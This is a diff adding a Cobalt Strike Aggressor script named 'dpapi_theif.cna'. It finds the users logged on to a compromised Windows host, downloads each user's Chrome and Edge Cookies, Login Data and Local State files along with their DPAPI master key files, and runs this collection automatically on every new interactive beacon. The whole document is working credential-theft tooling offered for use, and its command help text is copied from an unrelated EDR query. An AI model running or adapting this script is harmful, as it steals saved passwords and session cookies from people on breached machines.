@@ -1,0 +1,170 @@
+# dpapi_theif.cna
+## Author: @stumblebot
+# Automatically grabs some files containing DPAPI data from logged-on users
+#   Master key files from AppData\Local\Microsoft\Protect\
+#   Cookies, Login Data, and Local State files for Edge and Chrome
+## Based on some very nice code from @r3dqu1nn
+
+#todo
+#-Decrypt DPAPI Master key from current user via MS-BKRP
+#-Conditional behavior based on who you're running as (ex: Get system credentials only from an elevated context or do MS-BKRP collection only from domain users)
+#-Download DPAPI-protected credential files from %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+#-Can we dynamically set a allow/denylist that will persist while the cna is active?
+#-Can we dynamically set/disable autorun without modifying cna code?
+
+beacon_command_register("list_dir_v2", "Lists the content of a directory, returns an array",
+    "Syntax: edr_query [hostname] [arch]\n" .
+    "Checks the local or remote system for installed EDR products. **Note: Use localhost for [hostname] to query the local system**");
+
+sub list_dir_mk {
+    global('$mk_path');
+	$bid = $1;
+    $appdata_roaming_full_path = $2;
+    $mk_path = $appdata_roaming_full_path."Microsoft\\Protect";
+    bls($bid, $mk_path, &list_dir_mk_outer);
+}
+
+#Parse dem results
+sub list_dir_mk_outer {
+
+    local('$entry $type $size $modified $out $name_outer');
+    global('$mk_path_name_outer');
+    @results = split("\n", ["$3" trim]);
+    @matches = @();
+    foreach $entry (@results) {
+    ($type, $size, $modified, $name_outer) = split("\t", $entry);
+        if ('S-*' iswm $name_outer){
+            $mk_path_name_outer = $mk_path."\\".$name_outer;
+            bls($bid, $mk_path_name_outer, &list_dir_mk_inner);
+        }
+    }
+}
+
+sub list_dir_mk_inner {
+
+    local('$entry $type $size $modified $name_inner $out $name_inner');
+    @results = split("\n", ["$3" trim]);
+    @matches = @();
+    blog$($1,'2:'.$2);
+    blog$($1,'3:'.$3);
+    blog$($1,'4:'.$4);
+    blog$($1,'5:'.$5);
+    blog$($1,'6:'.$6);
+    blog$($1,'7:'.$7);
+    foreach $entry (@results) {
+    ($type, $size, $modified, $name_inner) = split("\t", $entry);
+        blog($1,$name_inner);
+        bdownload($1,$mk_path_name_outer."\\".$name_inner);
+    }
+}
+
+sub get_logons_cb {
+   # Declare local variables
+   local('$bid $result %info @users @browser_path');
+
+   # Assign parameters user friendly names
+   ($bid, $result, %info) = @_;
+
+    # Log the output back to beacon console
+    blog($bid, "received output:\n" . "get_logons_cb " . $result);
+
+    #process $result and create a deduplicated array of users
+    foreach $user (split("\n",$result)){
+        $clean_user = replace($user,"^.*\\\\","");
+        $check = iff($clean_user in @users,$null,$clean_user);
+        add(@users, $check);
+    }
+
+    #remove accounts we probably don't care about
+    remove(@users,'DefaultAccount','Guest','WDAGUtilityAccount','Users for \\\\localhost:','','Logged on users at ','localhost:');#,'stumblebot');
+
+    @browser_path = @("Google\\Chrome","Microsoft\\Edge");
+    foreach $username (@users) {
+        blog($1,$username);
+        foreach $b_path (@browser_path) {
+            $appdata_local_full_path = "C:\\Users\\".$username."\\AppData\\Local\\";
+            $appdata_roaming_full_path = "C:\\Users\\".$username."\\AppData\\Roaming\\";
+
+            blog($1,"Download ".$b_path." browser data from user ".$username);
+            bdownload($bid,$appdata_local_full_path.$b_path."\\User Data\\Default\\Cookies"); 
+            bdownload($bid,$appdata_local_full_path.$b_path."\\User Data\\Default\\Login Data"); 
+            bdownload($bid,$appdata_local_full_path.$b_path."\\User Data\\Local State");
+        }
+        &list_dir_mk($bid,$appdata_roaming_full_path);
+    }
+}
+
+sub cs_get_logons {
+   # Declare local variables
+   local('$bid @valid_opts %opts $opt_cnt $opt_ind $opt $value $info');
+
+   # Set the defaults
+   %opts["--target"] = "localhost";
+
+   # Assign parameters to the opts hash map
+   $bid = @_[0];
+   $opt_cnt = size(@_);
+   @valid_opts = @("--target", "--pid", "--arch");
+   for($opt_ind = 1; $opt_ind < $opt_cnt; $opt_ind++) { 
+      # Set the arg and value for this iteration
+      $opt = @_[$opt_ind];
+      $opt_ind++;
+      $value = iff( $opt_ind >= $opt_cnt, $null, @_[$opt_ind] );
+
+      # Do some simple validation on opt and value
+      if ($opt !in @valid_opts) {
+         berror($bid, "$opt is not a valid option.");
+         return;
+      }
+      if ($value is $null || $value in @valid_opts) {
+         berror($bid, "Missing or invalid value for the $opt option.");
+         return;
+      }
+
+      # Save the opt and value into the opts hash
+      %opts[$opt] = $value;
+   }
+
+   # Validate options
+   if ( (%opts["--pid"] !is $null) || (%opts["--arch"] !is $null) ) {
+      # At least one process injection options is used, validate them.
+      if (!-isnumber %opts["--pid"] || %opts["--pid"] < 0) {
+         berror($bid, "pid is not a valid: " . %opts["--pid"]);
+         return;
+      }
+      if (%opts["--arch"] !in @("x86", "x64")) {
+         berror($bid, "arch is not valid, must be x86 or x64.");
+         return;
+      }
+   }
+
+   # Build the info message
+   $info = "beacon: $bid will execute \'net logons\' on \'" . %opts["--target"] . "\'";
+
+   # Print some info to the script console
+   if (%opts["--pid"] >= 0 && %opts["--arch"] in @("x86", "x64")) {
+      println("$info using process injection: \(\'" . %opts["--pid"] . "\' \'" . %opts["--arch"] . "\'\)");
+   } else {
+      println("$info using fork&run");
+   }
+
+   # Use the lambda function in order to pass local variables via Pass by Name to the callback
+   bnet($bid, "logons", %opts["--target"], $null, %opts["--pid"], %opts["--arch"],
+      lambda({ get_logons_cb($1, $2, $3 %opts); }, \$opts));
+}
+
+alias dpapi_auto_collect{
+    cs_get_logons($1);
+}
+
+on beacon_initial_empty {
+    binput($1, "[New DNS Beacon. Holding off on auto-collection.]");
+    bcheckin($1);
+}
+
+on beacon_initial {
+    binput($1, "[Acting on new interactive beacon]");
+    bsleep($1, 0 );
+    cs_get_logons($1);
+    #bexit($1);
+}
